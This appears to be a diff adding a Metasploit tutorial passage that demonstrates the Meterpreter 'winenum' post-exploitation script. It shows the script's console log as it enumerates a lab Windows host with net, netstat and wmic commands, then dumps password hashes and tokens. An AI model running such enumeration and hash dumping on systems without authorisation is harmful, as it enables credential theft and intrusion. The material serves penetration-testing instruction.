@@ -1,0 +1,58 @@
+The winenum script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.
+
+meterpreter > run winenum
+
+[*] Running Windows Local Enumerion Meterpreter Script
+[*] New session on 10.211.55.128:4444...
+[*] Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
+[*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
+[*]     This is a VMware Workstation/Fusion Virtual Machine
+[*] Running Command List ...
+[*]     running command cmd.exe /c set
+[*]     running command arp -a
+[*]     running command ipconfig /all
+[*]     running command ipconfig /displaydns
+[*]     running command route print
+[*]     running command net view
+[*]     running command netstat -nao
+[*]     running command netstat -vb
+[*]     running command netstat -ns
+[*]     running command net accounts
+[*]     running command net accounts /domain
+[*]     running command net session
+[*]     running command net share
+[*]     running command net group
+[*]     running command net user
+[*]     running command net localgroup
+[*]     running command net localgroup administrators
+[*]     running command net group administrators
+[*]     running command net view /domain
+[*]     running command netsh firewall show config
+[*]     running command tasklist /svc
+[*]     running command tasklist /m
+[*]     running command gpresult /SCOPE COMPUTER /Z
+[*]     running command gpresult /SCOPE USER /Z
+[*] Running WMIC Commands ....
+[*]     running command wmic computersystem list brief
+[*]     running command wmic useraccount list
+[*]     running command wmic group list
+[*]     running command wmic service list brief
+[*]     running command wmic volume list brief
+[*]     running command wmic logicaldisk get description,filesystem,name,size
+[*]     running command wmic netlogin get name,lastlogon,badpasswordcount
+[*]     running command wmic netclient list brief
+[*]     running command wmic netuse get name,username,connectiontype,localname
+[*]     running command wmic share get name,path
+[*]     running command wmic nteventlog get path,filename,writeable
+[*]     running command wmic process list brief
+[*]     running command wmic startup list full
+[*]     running command wmic rdtoggle list
+[*]     running command wmic product get name,version
+[*]     running command wmic qfe
+[*] Extracting software list from registry
+[*] Finished Extraction of software list from registry
+[*] Dumping password hashes...
+[*] Hashes Dumped
+[*] Getting Tokens...
+[*] All tokens have been processed
+[*] Done!
